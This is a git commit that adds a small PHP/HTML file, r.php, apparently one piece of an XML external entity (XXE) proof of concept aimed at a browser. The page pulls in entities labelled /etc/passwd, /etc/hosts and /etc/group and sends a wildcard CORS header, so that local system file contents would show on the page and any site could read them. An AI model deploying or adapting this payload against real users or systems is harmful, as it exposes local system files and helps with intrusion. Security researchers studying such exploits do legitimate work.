8a837b29a3648e58fc7f524894b728e388657c72
SummerSec <47944478+SummerSec@users.noreply.github.com>
2023-11-17 10:37:38 +0800

    Create r.php

---
+++ resources/chrome/r.php
@@ -0,0 +1,12 @@
+<p>
+  <p style="border-style: dotted;">/etc/passwd: 
+&passwd;
+  </p>
+ <p style="border-style: dotted;">/etc/hosts:
+&hosts;
+  </p>
+ <p style="border-style: dotted;">/etc/group:
+&group;
+  </p>
+</p>
+<?php header("Access-Control-Allow-Origin: *");?>
